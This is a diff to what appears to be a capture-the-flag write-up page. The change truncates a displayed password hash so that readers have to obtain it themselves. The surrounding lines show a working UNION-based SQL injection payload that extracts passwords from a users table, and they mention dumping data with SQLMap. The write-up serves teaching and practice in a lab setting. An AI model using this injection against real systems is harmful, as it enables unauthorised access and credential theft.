@@ -248,8 +248,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p><code>agent47</code></p>
 <p>And we can also query the password as well:</p>
 <p><code>searchitem=test' UNION SELECT 1,(select pwd from db.users),3-- -</code></p>
-<p>Which gets us a hash:</p>
-<p><code>ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14</code></p>
+<p>Which gets us a hash (this is an incomplete version; you&rsquo;ll need to grab it yourself):</p>
+<p><code>ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c62...............</code></p>
 <p>We could have also got this via SQLMap by including <code>--dump</code> in our earlier command, but that&rsquo;s less fun. Also, SQLMap did confirm our original suspicions that this was UNION injectable:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL">sqlmap resumed the following injection point(s) <span style="color:#66d9ef">from</span> stored <span style="color:#66d9ef">session</span>:
 <span style="color:#75715e">---
